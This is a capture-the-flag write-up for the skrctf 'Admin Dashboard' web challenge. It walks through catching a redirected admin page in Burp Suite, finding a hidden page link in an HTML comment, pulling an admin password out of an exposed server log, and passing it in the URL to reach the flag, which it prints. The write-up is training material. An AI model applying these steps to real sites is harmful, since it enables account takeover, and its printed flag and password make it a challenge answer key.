# Admin Dashboard CTF Write-up

## Hints
- I'm quite lazy when developing this website  
- How request is redirected?  
- Trace how the request behaves when you go to `index.php`

Credits to 0xJackmeister, Check out his write-up at  
[https://github.com/0xJackmeister/SKR-CTF-Writeup/blob/main/Zero-Click/Web/admin-dashboard.sh](https://github.com/0xJackmeister/SKR-CTF-Writeup/blob/main/Zero-Click/Web/admin-dashboard.sh)

## Steps

1. Use Burp Suite to intercept request and response. Download it if you don't have it.

2. Original:   
   ```
   https://skrctf.me/ports/xxx/login.php
   ```
   Change URL to:  
   ```
   https://skrctf.me/ports/xxx/index.php
   ```

3. In Burp Suite, notice the response contains the admin page, but it quickly redirects back to login.php. You only see the HTML in the response, no page.

4. In the HTML, notice two important links:  
   ```
   <li class="nav-item">
       <a class="nav-link" href="logs.php">Logs</a>
   </li>
   <!--
   <li class="nav-item">
       <a class="nav-link" href="S3cr3t_P4g3.php">Flag</a>
   </li>
   -->
   ```

5. Following 0xJackmeister's write-up, download server logs here:
   ```
   https://skrctf.me/ports/xxx/server.log
   ```  

6. Open the file and search for admin username and password:  
   ```
   username=admin&password=U_W1ll_N3V3R_GU355_TH15_P%4055w0rD%21LOL
   ```

7. Go back to the login page. Instead of using the input fields, use the URL bar to login:  
   ```
   https://skrctf.me/ports/xxx/S3cr3t_P4g3.php?password=U_W1ll_N3V3R_GU355_TH15_P%4055w0rD%21LOL
   ```
8. After login, access the secret page:
   ```
   https://skrctf.me/ports/xxx/S3cr3t_P4g3.php?password=U_W1ll_N3V3R_GU355_TH15_P%4055w0rD%21LOL
   ```
9. The input boxes on the pages won’t work. Always use the URL bar to pass parameters.

10. The flag appears:  
    ```
    SKR{L4Zy_M4y_C4u53_7R0uBl3_b6dfa9}
    ```
    
